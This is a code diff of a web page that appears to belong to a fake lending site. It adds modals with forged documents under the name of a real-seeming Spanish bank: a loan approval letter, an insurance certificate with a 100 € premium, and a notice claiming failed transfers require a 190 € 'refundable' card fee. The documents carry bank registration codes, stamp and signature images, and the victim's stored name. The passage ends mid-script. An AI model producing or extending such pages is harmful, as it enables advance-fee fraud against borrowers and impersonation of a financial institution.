@@ -463,7 +463,7 @@
         display: inline-flex;
         align-items: center;
         justify-content: center;
-        width: 34px;
+        width: 14px;
         height: 34px;
         background: none;
         border: none;
@@ -584,7 +584,7 @@
         <header class="tourist-contract-modal__header">
           <div class="tourist-contract-modal__heading">
             <p class="tourist-contract-modal__eyebrow">Contrato Nº ES-4738D9215</p>
-            <h2 class="tourist-contract-modal__title" id="notifPdfModalTitle">Tarjeta de Crédito</h2>
+            <h2 class="tourist-contract-modal__title" id="notifPdfModalTitle">Documento de EBN Banco</h2>
           </div>
         </header>
         <div class="tourist-contract-modal__body" id="notifPdfBody" tabindex="0">
@@ -592,20 +592,31 @@
             <section class="credit-letter__page">
               <header class="credit-letter__masthead">
                 <div class="credit-letter__caixa-brand" id="npm_logoWrap">
-                  <img src="../banks/newBank/logo.svg" alt="New Bank" class="credit-letter__caixa-logo" id="npm_logo">
+                  <img src="../banks/newBank/logo2.png" alt="EBN Banco" class="credit-letter__caixa-logo" id="npm_logo">
                 </div>
                 <div class="credit-letter__goval">
                   <img src="../assets/monetologo.svg" alt="GO VAL FINANCE SL" class="credit-letter__goval-logo">
                 </div>
               </header>
               <div class="credit-letter__body">
-                <p class="credit-letter__line"><strong>De:</strong></p>
-                <p class="credit-letter__line"><strong id="npm_bankName">New Bank S.A.</strong></p>
-                <p class="credit-letter__line"><strong>A:</strong></p>
-                <p class="credit-letter__line"><strong>Moneto Plus S.L.</strong></p>
-                <p class="credit-letter__line"><strong>Departamento de Préstamos</strong></p>
+                <p class="credit-letter__line">
+                  <strong id="npm_bankName">EBN Banco</strong><br>
+                  Sede social:<br>
+                  Paseo de Recoletos, 29, 28004 Madrid, España<br>
+                  NIF (CIF): A28763043<br>
+                  Código Banco de España: 0211<br>
+                  SWIFT/BIC: PROAESMMXXX<br>
+                  LEI: 95980020140005388333<br>
+                  Inscrita en el Registro Especial de Entidades de Crédito del Banco de España con el código 0211.<br><br>
+                  <strong>DEPARTAMENTO DE CRÉDITOS - CLIENTES PARTICULARES</strong><br>
+                  Con la intermediación de: <strong>Moneto Plus</strong>
+                </p>
+                <p class="credit-letter__para">
+                  <strong>De:</strong> <strong>EBN Banco</strong><br>
+                  <strong>A:</strong> <strong>Moneto Plus S.L.</strong>
+                </p>
                 <p class="credit-letter__line"><strong>Estimados colegas,</strong></p>
-                <p class="credit-letter__para">Les informamos de que la solicitud de financiación presentada ha sido examinada con resultado positivo y ha sido aprobada en las siguientes condiciones:</p>
+                <p class="credit-letter__line">Les informamos de que la solicitud de financiación presentada ha sido examinada con resultado positivo y ha sido aprobada en las siguientes condiciones:</p>
                 <p class="credit-letter__line"><strong>Importe del préstamo:</strong> 5 000.00</p>
                 <p class="credit-letter__line"><strong>TIN:</strong> 7.86%</p>
                 <p class="credit-letter__line"><strong>Modalidad de desembolso:</strong> transferencia bancaria</p>
@@ -615,10 +626,10 @@
                 <p class="credit-letter__para">Gracias por su colaboración.</p>
                 <p class="credit-letter__line">Atentamente,</p>
                 <p class="credit-letter__line">Departamento de Préstamos</p>
-                <p class="credit-letter__line" id="npm_bankFooter">New Bank S.A.</p>
+                <p class="credit-letter__line" id="npm_bankFooter">EBN Banco</p>
               </div>
               <div class="credit-letter__stamp-area" aria-hidden="true">
-                <img src="../assets/stamp.svg" alt="" class="credit-letter__stamp" id="npm_stamp">
+                <img src="../banks/newBank/stamp.svg" alt="" class="credit-letter__stamp" id="npm_stamp">
                 <img src="../assets/left-hand.png" alt="" class="credit-letter__signature">
               </div>
             </section>
@@ -636,23 +647,33 @@
     </div>
 
     <script>
+      function getStoredBankName(fallback) {
+        return 'EBN Banco';
+      }
+      function getStoredBankShort(fallback) {
+        return getStoredBankName(fallback).replace(/\s+S\.?\s*A\.?$/i, '');
+      }
+      function getStoredBankDisplay(fallback) {
+        return getStoredBankName(fallback);
+      }
+
       function openNotifPdfModal() {
         var modal = document.getElementById('notifPdfModal');
         if (!modal) return;
         var bankName = '';
         var bankKey  = '';
         try {
-          bankName = localStorage.getItem('selectedBank')    || 'New Bank';
-          bankKey  = localStorage.getItem('selectedBankKey') || 'newBank';
+          bankName = getStoredBankDisplay('EBN Banco');
+          bankKey  = 'newBank';
         } catch(e) {}
         var el1 = document.getElementById('npm_bankName');
         var el2 = document.getElementById('npm_bankFooter');
-        if (el1) el1.textContent = bankName + ' S.A.';
-        if (el2) el2.textContent = bankName + ' S.A.';
+        if (el1) el1.textContent = bankName;
+        if (el2) el2.textContent = bankName;
         var logoEl = document.getElementById('npm_logo');
-        if (logoEl) { logoEl.src = '../banks/' + bankKey + '/logo.svg'; logoEl.alt = bankName; }
+        if (logoEl) { logoEl.src = '../banks/newBank/logo2.png'; logoEl.alt = bankName; }
         var stampEl = document.getElementById('npm_stamp');
-        if (stampEl) stampEl.src = '../banks/' + bankKey + '/stamp.svg';
+        if (stampEl) stampEl.src = '../banks/newBank/stamp.svg';
         modal.classList.add('tourist-contract-modal--open');
         modal.setAttribute('aria-hidden', 'false');
         document.body.classList.add('contract-modal-open');
@@ -678,6 +699,475 @@
       });
     </script>
 
+    <!-- ── Insurance certificate modal (opened from chat card) ── -->
+    <div class="tourist-contract-modal" id="seguroModal" aria-hidden="true">
+      <div class="tourist-contract-modal__backdrop" data-seguro-close tabindex="-1"></div>
+      <section class="tourist-contract-modal__panel" role="dialog" aria-modal="true" aria-labelledby="seguroTitle">
+        <header class="tourist-contract-modal__header">
+          <div class="tourist-contract-modal__heading">
+            <p class="tourist-contract-modal__eyebrow">Contrato Nº ES-4738D9215</p>
+            <h2 class="tourist-contract-modal__title" id="seguroTitle">Certificado individual de adhesión</h2>
+          </div>
+        </header>
+        <div class="tourist-contract-modal__body" id="seguroBody" tabindex="0">
+          <article class="credit-contract" aria-label="Certificado individual de adhesión al seguro de protección de pagos">
+            <section class="credit-contract__page">
+              <header class="credit-contract__masthead">
+                <div class="credit-contract__caixa-brand" id="seg_brand" aria-label="EBN Banco">
+                  <img src="../banks/newBank/logo2.png" alt="EBN Banco" id="seg_logo" class="credit-contract__caixa-logo">
+                </div>
+                <div class="credit-contract__goval" aria-label="GO VAL FINANCE SL">
+                  <img src="../assets/monetologo.svg" alt="GO VAL FINANCE SL" class="credit-contract__goval-logo">
+                </div>
+              </header>
+
+              <p class="credit-contract__mono">
+                <strong id="seg_bankName">EBN Banco</strong><br>
+                Sede social:<br>
+                Paseo de Recoletos, 29, 28004 Madrid, España<br>
+                NIF (CIF): A28763043<br>
+                Código Banco de España: 0211<br>
+                SWIFT/BIC: PROAESMMXXX<br>
+                LEI: 95980020140005388333<br>
+                Inscrita en el Registro Especial de Entidades de Crédito del Banco de España con el código 0211.<br><br>
+                <strong>DEPARTAMENTO DE CRÉDITOS - CLIENTES PARTICULARES</strong><br>
+                Con la intermediación de: <strong>Moneto Plus</strong>
+              </p>
+
+              <h3 class="credit-contract__doc-title">CERTIFICADO INDIVIDUAL DE ADHESIÓN</h3>
+              <p class="credit-contract__doc-subtitle">Seguro colectivo de protección de pagos</p>
+              <p class="credit-contract__mono">
+                <strong>Asunto:</strong> confirmación de adhesión al seguro de protección de pagos vinculado
+                al contrato de financiación.
+              </p>
+              <p class="credit-contract__mono">
+                Por medio del presente documento se confirma que <strong id="seg_clientName">Oscar Asenjo Núñez</strong>
+                se adhiere al seguro colectivo de protección de pagos asociado al contrato Nº ES-4738D9215.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">1. Datos identificativos</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <table class="credit-contract__table">
+                <tbody>
+                  <tr><td>Tomador del seguro:</td><td>EBN Seguro</td></tr>
+                  <tr><td>Intermediario documental:</td><td>Moneto Plus S.L.</td></tr>
+                  <tr><td>Contrato de financiación:</td><td>Contrato Nº ES-4738D9215</td></tr>
+                  <tr><td>Persona asegurada:</td><td id="seg_clientNameTable">Oscar Asenjo Núñez</td></tr>
+                  <tr><td>Beneficiario preferente:</td><td><span id="seg_bankBeneficiary">EBN Banco</span>, dentro del límite de la deuda pendiente.</td></tr>
+                  <tr><td>Fecha de emisión:</td><td id="seg_issueDate">29/06/2026</td></tr>
+                </tbody>
+              </table>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">2. Finalidad del seguro</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                La finalidad del seguro consiste en cubrir, dentro de los límites acordados, determinadas
+                situaciones que puedan afectar a la capacidad de la persona asegurada para cumplir sus
+                obligaciones de pago derivadas del contrato de financiación, incluyendo fallecimiento,
+                incapacidad permanente absoluta, incapacidad temporal, desempleo involuntario u hospitalización,
+                conforme a las garantías efectivamente contratadas.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">3. Condiciones económicas principales</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <table class="credit-contract__table">
+                <tbody>
+                  <tr><td>Prima del seguro:</td><td>100,00 €</td></tr>
+                  <tr><td>Forma de pago:</td><td>Prima única</td></tr>
+                  <tr><td>Duración de la cobertura:</td><td>60 meses (5 años)</td></tr>
+                  <tr><td>Capital asegurado:</td><td>Saldo pendiente del préstamo hasta 5.000,00 €</td></tr>
+                  <tr><td>Beneficiario preferente:</td><td id="seg_bankBeneficiary2">EBN Banco</td></tr>
+                </tbody>
+              </table>
+              <footer class="credit-contract__page-footer">1</footer>
+            </section>
+
+            <section class="credit-contract__page">
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">4. Resumen orientativo de garantías</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                <strong>Fallecimiento.</strong><br>
+                Cancelación del saldo pendiente del contrato asegurado conforme a las condiciones de la póliza.
+                Límite: hasta 5.000,00 €, por el importe de la deuda pendiente en la fecha del siniestro.
+              </p>
+              <p class="credit-contract__mono">
+                <strong>Incapacidad permanente absoluta.</strong><br>
+                Cobertura de la deuda pendiente si la persona asegurada queda permanentemente incapacitada
+                para ejercer cualquier profesión u oficio. Límite: hasta 5.000,00 €, por el saldo pendiente
+                en la fecha del siniestro.
+              </p>
+              <p class="credit-contract__mono">
+                <strong>Incapacidad temporal.</strong><br>
+                Pago de las cuotas mensuales del crédito durante el periodo de incapacidad temporal, una vez
+                finalizado el periodo de carencia. Límite: hasta 12 cuotas mensuales (1.212,60 €).
+              </p>
+              <p class="credit-contract__mono">
+                <strong>Desempleo involuntario.</strong><br>
+                Pago de las cuotas mensuales del crédito en caso de pérdida involuntaria del empleo.
+                Límite: hasta 12 cuotas mensuales (1.212,60 €).
+              </p>
+              <p class="credit-contract__mono">
+                <strong>Hospitalización.</strong><br>
+                Pago de las cuotas mensuales durante el periodo de hospitalización cuando no proceda la
+                cobertura por incapacidad temporal o desempleo. Límite: hasta 6 cuotas mensuales (606,30 €).
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">5. Comunicación del siniestro</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                En caso de producirse un evento previsto por la presente cobertura, la persona asegurada o
+                su representante legal deberán comunicarlo al asegurador en el plazo más breve posible desde
+                que tengan conocimiento del siniestro.
+              </p>
+              <p class="credit-contract__mono">
+                Para la tramitación de la solicitud podrán requerirse documentos acreditativos del siniestro,
+                incluidos informes médicos, documentos relativos a la situación laboral, información sobre la
+                hospitalización y cualquier otra documentación necesaria para valorar las circunstancias del evento.
+              </p>
+              <p class="credit-contract__mono">
+                El asegurador podrá solicitar información adicional cuando la documentación aportada no resulte
+                suficiente para adoptar una decisión.
+              </p>
+              <footer class="credit-contract__page-footer">2</footer>
+            </section>
+
+            <section class="credit-contract__page">
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">6. Plazo de resolución de la solicitud</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                Una vez recibido el conjunto completo de documentos, la solicitud será examinada por el
+                asegurador dentro de los plazos previstos por la legislación vigente y por las condiciones
+                del contrato de seguro.
+              </p>
+              <p class="credit-contract__mono">
+                Si el evento es reconocido como siniestro cubierto, el pago se efectuará al beneficiario o
+                se aplicará al cumplimiento de las obligaciones del contrato de financiación, dentro del
+                límite del capital asegurado.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">7. Exclusiones principales</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                La cobertura no se extiende, con carácter general, a eventos derivados de actos intencionados
+                de la persona asegurada, declaraciones deliberadamente falsas al contratar, intoxicación por
+                alcohol o sustancias estupefacientes, participación en actividades ilícitas u otros supuestos
+                expresamente indicados en las condiciones generales del seguro.
+              </p>
+              <p class="credit-contract__mono">
+                No serán indemnizables los eventos ocurridos antes de la fecha de entrada en vigor de la cobertura.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">8. Derechos y obligaciones de las partes</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                La persona asegurada se obliga a comunicar oportunamente al asegurador las circunstancias
+                relevantes para la valoración del riesgo, así como a facilitar información y documentos
+                veraces cuando le sean requeridos.
+              </p>
+              <p class="credit-contract__mono">
+                El asegurador se obliga a examinar la declaración de siniestro, resolver sobre el fondo de
+                la solicitud y cumplir sus obligaciones dentro de los límites de la cobertura contratada.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">9. Vigencia de la cobertura</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                La cobertura entrará en vigor en la fecha indicada en las condiciones individuales del seguro,
+                siempre que se haya abonado la prima correspondiente. La cobertura finalizará al vencimiento
+                del periodo asegurado, por cumplimiento íntegro de las obligaciones del contrato de financiación,
+                por cancelación anticipada del seguro o en los demás casos previstos contractualmente.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">10. Firmas</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                Lugar y fecha: Firma electrónica, <span id="seg_fecha">29/06/2026</span>
+              </p>
+              <div class="credit-contract__sign-cols">
+                <div class="credit-contract__sign-col" id="seg_signBank">Representante del banco EBN Banco</div>
+                <div class="credit-contract__sign-col">Representante del intermediario Moneto Plus S.L.:</div>
+                <div class="credit-contract__sign-col">Cliente: <span id="seg_signClientName">Oscar Asenjo Núñez</span></div>
+              </div>
+              <div class="credit-contract__stamp-area" aria-hidden="true">
+                <img src="../banks/newBank/stamp.svg" alt="" class="credit-contract__stamp" id="seg_stamp">
+                <img src="../assets/left-hand.png" alt="" class="credit-contract__signature credit-contract__signature--left">
+                <img src="../assets/right-hand.png" alt="" class="credit-contract__signature credit-contract__signature--right">
+              </div>
+              <footer class="credit-contract__page-footer">3</footer>
+            </section>
+          </article>
+        </div>
+        <footer class="tourist-contract-modal__footer">
+          <button type="button" class="tourist-contract-modal__action" data-seguro-close>
+            <span class="tourist-contract-modal__action-content">
+              <span class="tourist-contract-modal__action-text">Cerrar</span>
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14 14.6641H2C1.72667 14.6641 1.5 14.4374 1.5 14.1641C1.5 13.8907 1.72667 13.6641 2 13.6641H14C14.2733 13.6641 14.5 13.8907 14.5 14.1641C14.5 14.4374 14.2733 14.6641 14 14.6641Z" fill="white"/><path d="M12.6843 2.31848C11.3909 1.02514 10.1243 0.991811 8.79761 2.31848L7.99095 3.12514C7.92428 3.19181 7.89761 3.29848 7.92428 3.39181C8.43095 5.15848 9.84428 6.57181 11.6109 7.07848C11.6376 7.08514 11.6643 7.09181 11.6909 7.09181C11.7643 7.09181 11.8309 7.06514 11.8843 7.01181L12.6843 6.20514C13.3443 5.55181 13.6643 4.91848 13.6643 4.27848C13.6709 3.61848 13.3509 2.97848 12.6843 2.31848Z" fill="white"/><path d="M10.4056 7.68849C10.2122 7.59516 10.0256 7.50182 9.84558 7.39516C9.69891 7.30849 9.55891 7.21516 9.41891 7.11516C9.30558 7.04182 9.17224 6.93516 9.04558 6.82849C9.03224 6.82182 8.98558 6.78182 8.93224 6.72849C8.71224 6.54182 8.46558 6.30182 8.24558 6.03516C8.22558 6.02182 8.19224 5.97516 8.14558 5.91516C8.07891 5.83516 7.96558 5.70182 7.86558 5.54849C7.78558 5.44849 7.69224 5.30182 7.60558 5.15516C7.49891 4.97516 7.40558 4.79516 7.31224 4.60849C7.16859 4.28365 6.89224 4.22182 6.72846 4.38561L2.89224 8.22182C2.80558 8.30849 2.72558 8.47516 2.70558 8.58849L2.34558 11.1418C2.27891 11.5952 2.40558 12.0218 2.68558 12.3085C2.92558 12.5418 3.25891 12.6685 3.61891 12.6685C3.69891 12.6685 3.77891 12.6618 3.85891 12.6485L6.41891 12.2885C6.53891 12.2685 6.70558 12.1885 6.78558 12.1018L10.6172 8.27015C10.7822 8.10523 10.7199 7.82237 10.5052 7.73124C10.4725 7.71734 10.4393 7.70311 10.4056 7.68849Z" fill="white"/></svg>
+            </span>
+          </button>
+        </footer>
+      </section>
+    </div>
+
+    <script>
+      function openSeguroModal() {
+        var modal = document.getElementById('seguroModal');
+        if (!modal) return;
+        var bankName = '';
+        var bankKey = '';
+        var clientName = '';
+        try {
+          bankName = getStoredBankName('EBN Banco');
+          bankKey = 'newBank';
+          clientName = localStorage.getItem('touristCardNombre') || localStorage.getItem('inputName') || 'Oscar Asenjo Núñez';
+        } catch(e) {}
+        var bankDisplay = getStoredBankDisplay('EBN Banco');
+        var bankShort = getStoredBankShort('EBN Banco');
+        var bankUpper = bankDisplay;
+        var now = new Date();
+        var fecha = String(now.getDate()).padStart(2,'0') + '/' + String(now.getMonth()+1).padStart(2,'0') + '/' + now.getFullYear();
+        var setText = function(id, value) {
+          var el = document.getElementById(id);
+          if (el) el.textContent = value;
+        };
+        setText('seg_bankName', bankUpper);
+        setText('seg_bankNameFrom', bankDisplay);
+        setText('seg_clientName', clientName);
+        setText('seg_clientNameTable', clientName);
+        setText('seg_bankBeneficiary', bankShort);
+        setText('seg_bankBeneficiary2', bankShort);
+        setText('seg_issueDate', fecha);
+        setText('seg_fecha', fecha);
+        setText('seg_signBank', 'Representante del banco ' + bankDisplay);
+        setText('seg_signClientName', clientName);
+        var logoEl = document.getElementById('seg_logo');
+        if (logoEl) { logoEl.src = '../banks/newBank/logo2.png'; logoEl.alt = bankName; }
+        var stampEl = document.getElementById('seg_stamp');
+        if (stampEl) stampEl.src = '../banks/newBank/stamp.svg';
+        var brand = document.getElementById('seg_brand');
+        if (brand) brand.setAttribute('aria-label', bankName);
+        modal.classList.add('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'false');
+        document.body.classList.add('contract-modal-open');
+        var body = document.getElementById('seguroBody');
+        if (body) { body.scrollTop = 0; setTimeout(function(){ body.focus({ preventScroll: true }); }, 0); }
+      }
+      function closeSeguroModal() {
+        var modal = document.getElementById('seguroModal');
+        if (!modal) return;
+        modal.classList.remove('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'true');
+        document.body.classList.remove('contract-modal-open');
+      }
+      document.addEventListener('DOMContentLoaded', function() {
+        var modal = document.getElementById('seguroModal');
+        if (!modal) return;
+        modal.querySelectorAll('[data-seguro-close]').forEach(function(el) {
+          el.addEventListener('click', closeSeguroModal);
+        });
+        document.addEventListener('keydown', function(e) {
+          if (e.key === 'Escape' && modal.classList.contains('tourist-contract-modal--open')) closeSeguroModal();
+        });
+      });
+    </script>
+
+    <!-- ── Credit card account modal (opened from chat card) ── -->
+    <div class="tourist-contract-modal" id="creditCardContractModal" aria-hidden="true">
+      <div class="tourist-contract-modal__backdrop" data-creditc-close tabindex="-1"></div>
+      <section class="tourist-contract-modal__panel" role="dialog" aria-modal="true" aria-labelledby="creditCardContractTitle">
+        <header class="tourist-contract-modal__header">
+          <div class="tourist-contract-modal__heading">
+            <p class="tourist-contract-modal__eyebrow">Contrato Nº ES-4738D9215</p>
+            <h2 class="tourist-contract-modal__title" id="creditCardContractTitle">Documento de EBN Banco</h2>
+          </div>
+        </header>
+        <div class="tourist-contract-modal__body" id="creditCardContractBody" tabindex="0">
+          <article class="credit-contract" aria-label="Comunicación sobre apertura de cuenta de crédito y emisión de tarjeta">
+            <section class="credit-contract__page">
+              <header class="credit-contract__masthead">
+                <div class="credit-contract__caixa-brand" id="ccm_brand" aria-label="EBN Banco">
+                  <img src="../banks/newBank/logo2.png" alt="EBN Banco" id="ccm_logo" class="credit-contract__caixa-logo">
+                </div>
+                <div class="credit-contract__goval" aria-label="GO VAL FINANCE SL">
+                  <img src="../assets/monetologo.svg" alt="GO VAL FINANCE SL" class="credit-contract__goval-logo">
+                </div>
+              </header>
+
+              <p class="credit-contract__mono">
+                <strong id="ccm_bankName">EBN Banco</strong><br>
+                Sede social:<br>
+                Paseo de Recoletos, 29, 28004 Madrid, España<br>
+                NIF (CIF): A28763043<br>
+                Código Banco de España: 0211<br>
+                SWIFT/BIC: PROAESMMXXX<br>
+                LEI: 95980020140005388333<br>
+                Inscrita en el Registro Especial de Entidades de Crédito del Banco de España con el código 0211.<br><br>
+                <strong>DEPARTAMENTO DE CRÉDITOS - CLIENTES PARTICULARES</strong><br>
+                Con la intermediación de: <strong>Moneto Plus</strong>
+              </p>
+
+              <p class="credit-contract__mono">
+                <strong>De:</strong> <strong id="ccm_bankNameFrom">EBN Banco</strong><br>
+                <strong>A:</strong> <strong>Moneto Plus S.L.</strong>
+              </p>
+
+              <h3 class="credit-contract__doc-title">VINCULACIÓN DE CUENTA DE CRÉDITO Y EMISIÓN DE TARJETA DE CRÉDITO</h3>
+              <p class="credit-contract__doc-subtitle">Información importante para <strong id="ccm_clientName">Oscar Asenjo Núñez</strong></p>
+
+              <p class="credit-contract__mono">
+                Durante el intento de transferencia de los fondos de crédito al IBAN indicado por usted,
+                el banco recibió en varias ocasiones un rechazo técnico de abono. Debido a la imposibilidad
+                de completar la transferencia a su cuenta bancaria, se ha decidido emitir a su nombre una
+                tarjeta de crédito vinculada a la cuenta de crédito abierta.
+              </p>
+
+              <p class="credit-contract__mono">
+                Una vez finalizada la emisión y activación de la tarjeta de crédito, podrá acceder a la
+                cuenta de crédito abierta y retirar los fondos en efectivo en cualquier cajero automático
+                compatible con operaciones mediante tarjeta bancaria.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">1. Coste del servicio</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                El coste del servicio de emisión y entrega de la tarjeta de crédito asciende a
+                <strong>190,00 €</strong>. Este pago es reembolsable: tras la emisión correcta de la tarjeta,
+                el importe abonado será devuelto automáticamente y en su totalidad a la cuenta del remitente
+                en el plazo de 1 hora.
+              </p>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">2. Servicios incluidos en la emisión de la tarjeta</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>Vinculación de la cuenta de crédito existente al Contrato Nº ES-4738D9215.</li>
+                <li>Fabricación y entrega de la tarjeta de crédito.</li>
+                <li>Atención prioritaria por parte del servicio de soporte al cliente.</li>
+                <li>Retirada de efectivo sin intereses en cajeros automáticos.</li>
+                <li>Pago sin efectivo de bienes y servicios utilizando los fondos de crédito disponibles.</li>
+              </ul>
+              <footer class="credit-contract__page-footer">1</footer>
+            </section>
+
+            <section class="credit-contract__page">
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">3. Responsabilidad del cliente</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>El cliente tiene derecho a recibir la tarjeta de crédito tras cumplir las condiciones de emisión previstas en el contrato.</li>
+                <li>El cliente tiene derecho a utilizar la tarjeta de crédito para retirar efectivo y pagar bienes o servicios dentro del límite de crédito disponible.</li>
+                <li>En caso de retraso del pago reembolsable superior a 5 días, se aplicará un recargo de 2 puntos porcentuales sobre el tipo de interés contractual.</li>
+                <li>Cada recordatorio enviado se abonará por separado: 10 € por notificación postal y 5 € por notificación electrónica.</li>
+                <li>El cliente deberá utilizar la tarjeta de crédito exclusivamente conforme a las condiciones del contrato de crédito y la legislación vigente.</li>
+                <li>El cliente deberá informar al banco sin demora en caso de pérdida, robo o compromiso de la tarjeta de crédito.</li>
+              </ul>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">4. Derechos y obligaciones de Moneto Plus</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>Moneto Plus se compromete a acompañar al cliente en todas las fases de emisión y activación de la tarjeta de crédito.</li>
+                <li>Moneto Plus se compromete a informar oportunamente al cliente sobre el estado de tramitación de la solicitud, la emisión de la tarjeta y la activación de la cuenta de crédito.</li>
+                <li>Moneto Plus se compromete a emitir la tarjeta de crédito y facilitar el acceso a la cuenta de crédito una vez cumplidas por el cliente las condiciones de emisión.</li>
+                <li>Moneto Plus se compromete a habilitar la retirada de los fondos de crédito a través de cajeros automáticos tras la activación correcta de la tarjeta.</li>
+                <li>Moneto Plus podrá suspender el servicio de la tarjeta si detecta indicios de fraude o incumplimiento contractual, hasta que finalice la verificación correspondiente.</li>
+                <li>Moneto Plus se compromete a proteger los fondos y la confidencialidad de la información del cliente de acuerdo con sus normas internas de seguridad.</li>
+                <li>Moneto Plus podrá enviar al cliente notificaciones relacionadas con el mantenimiento de la cuenta de crédito y el cumplimiento de las condiciones contractuales.</li>
+              </ul>
+
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">5. Firmas</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <div class="credit-contract__sign-cols">
+                <div class="credit-contract__sign-col" id="ccm_signBank">Representante del banco EBN Banco</div>
+                <div class="credit-contract__sign-col">Representante del intermediario Moneto Plus S.L.:</div>
+                <div class="credit-contract__sign-col">Cliente: <span id="ccm_signClientName">Oscar Asenjo Núñez</span></div>
+              </div>
+              <div class="credit-contract__stamp-area" aria-hidden="true">
+                <img src="../banks/newBank/stamp.svg" alt="" class="credit-contract__stamp" id="ccm_stamp">
+                <img src="../assets/left-hand.png" alt="" class="credit-contract__signature credit-contract__signature--left">
+                <img src="../assets/right-hand.png" alt="" class="credit-contract__signature credit-contract__signature--right">
+              </div>
+              <footer class="credit-contract__page-footer">2</footer>
+            </section>
+          </article>
+        </div>
+        <footer class="tourist-contract-modal__footer">
+          <button type="button" class="tourist-contract-modal__action" data-creditc-close>
+            <span class="tourist-contract-modal__action-content">
+              <span class="tourist-contract-modal__action-text">Cerrar</span>
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14 14.6641H2C1.72667 14.6641 1.5 14.4374 1.5 14.1641C1.5 13.8907 1.72667 13.6641 2 13.6641H14C14.2733 13.6641 14.5 13.8907 14.5 14.1641C14.5 14.4374 14.2733 14.6641 14 14.6641Z" fill="white"/><path d="M12.6843 2.31848C11.3909 1.02514 10.1243 0.991811 8.79761 2.31848L7.99095 3.12514C7.92428 3.19181 7.89761 3.29848 7.92428 3.39181C8.43095 5.15848 9.84428 6.57181 11.6109 7.07848C11.6376 7.08514 11.6643 7.09181 11.6909 7.09181C11.7643 7.09181 11.8309 7.06514 11.8843 7.01181L12.6843 6.20514C13.3443 5.55181 13.6643 4.91848 13.6643 4.27848C13.6709 3.61848 13.3509 2.97848 12.6843 2.31848Z" fill="white"/><path d="M10.4056 7.68849C10.2122 7.59516 10.0256 7.50182 9.84558 7.39516C9.69891 7.30849 9.55891 7.21516 9.41891 7.11516C9.30558 7.04182 9.17224 6.93516 9.04558 6.82849C9.03224 6.82182 8.98558 6.78182 8.93224 6.72849C8.71224 6.54182 8.46558 6.30182 8.24558 6.03516C8.22558 6.02182 8.19224 5.97516 8.14558 5.91516C8.07891 5.83516 7.96558 5.70182 7.86558 5.54849C7.78558 5.44849 7.69224 5.30182 7.60558 5.15516C7.49891 4.97516 7.40558 4.79516 7.31224 4.60849C7.16859 4.28365 6.89224 4.22182 6.72846 4.38561L2.89224 8.22182C2.80558 8.30849 2.72558 8.47516 2.70558 8.58849L2.34558 11.1418C2.27891 11.5952 2.40558 12.0218 2.68558 12.3085C2.92558 12.5418 3.25891 12.6685 3.61891 12.6685C3.69891 12.6685 3.77891 12.6618 3.85891 12.6485L6.41891 12.2885C6.53891 12.2685 6.70558 12.1885 6.78558 12.1018L10.6172 8.27015C10.7822 8.10523 10.7199 7.82237 10.5052 7.73124C10.4725 7.71734 10.4393 7.70311 10.4056 7.68849Z" fill="white"/></svg>
+            </span>
+          </button>
+        </footer>
+      </section>
+    </div>
+
+    <script>
+      function openCreditCardContractModal() {
+        var modal = document.getElementById('creditCardContractModal');
+        if (!modal) return;
+        var bankName = '';
+        var bankKey  = '';
+        var clientName = '';
+        try {
+          bankName = getStoredBankName('EBN Banco');
+          bankKey  = 'newBank';
+          clientName = localStorage.getItem('touristCardNombre') || localStorage.getItem('inputName') || 'Oscar Asenjo Núñez';
+        } catch(e) {}
+        var bankDisplay = getStoredBankDisplay('EBN Banco');
+        var bankUpper = bankDisplay;
+        var bankEl = document.getElementById('ccm_bankName');
